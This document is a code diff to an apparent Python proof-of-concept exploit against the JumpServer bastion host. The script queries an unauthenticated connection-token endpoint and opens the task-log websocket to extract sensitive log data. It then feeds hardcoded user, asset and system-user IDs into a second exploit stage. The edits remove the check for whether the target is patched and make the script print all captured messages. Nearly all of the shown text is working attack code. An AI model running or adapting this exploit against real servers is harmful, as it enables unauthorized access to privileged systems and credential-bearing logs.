@@ -256,6 +256,7 @@ class ws_long(WebSocketClient):
         resp = json.loads(str(resp))
         # print(resp)
         data = resp['message']
+        print(data)
         if "/api/v1/perms/asset-permissions/user/validate/?" in data:
             print(data)
 
@@ -296,20 +297,23 @@ async def main_logic(target_url):
 def POC_1(target_url):
     vuln_url = target_url + "/api/v1/users/connection-token/?user-only=1"
     response = requests.get(url=vuln_url, timeout=5)
-    if response.status_code == 401 or response.status_code == 403 or response.status_code == 404:
-        print("\033[32m[o] 目标 {} JumpServer堡垒机为未修复漏洞版本，请通过日志获取关键参数\033[0m".format(target_url))
-        ws_open = str(input("\033[32m[o] 是否想要提取日志（Y/N） >>> \033[0m"))
+    print(response.status_code)
+    ws_open = str(input("\033[32m[o] 是否想要提取日志（Y/N） >>> \033[0m"))
+    try:
         if ws_open == "Y" or ws_open == "y":
-            ws = target_url.strip("http://")
-            try:
-                ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws))
-                ws.connect()
-                ws.run_forever()
-                ws.close()
-            except KeyboardInterrupt:
-                ws.close()
-    else:
-        print("\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\033[0m")
+                ws = target_url.strip("http://")
+                try:
+                    ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws))
+                    ws.connect()
+                    ws.run_forever()
+                    ws.close()
+                except KeyboardInterrupt:
+                    ws.close()
+        else:
+            print("\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\033[0m")
+            sys.exit(0)
+    except Exception as e:
+        print("\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息,{}\033[0m".format(e))
         sys.exit(0)
 
 
@@ -338,9 +342,9 @@ def POC_2(target_url, user, asset, system_user):
 if __name__ == '__main__':
     title()
     target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
-    user = "7c30bef8-61e2-4644-bf90-f7cacd1936f8"
-    asset = "2bb3df36-8e63-4ace-9f8f-c77e95ffc549"
-    system_user = "abd00340-e9ba-40af-a432-9a85f867b6bb"
+    user = "ed3460eb-3c70-4beb-b631-f8f91c39bdd1"
+    asset = "37fce0b0-cc4f-4822-8c33-afdebc888fa7"
+    system_user = "da09ddd7-fd3f-46c3-914d-752883a4d950"
     POC_1(target_url)
     POC_2(target_url, user, asset, system_user)
 ```
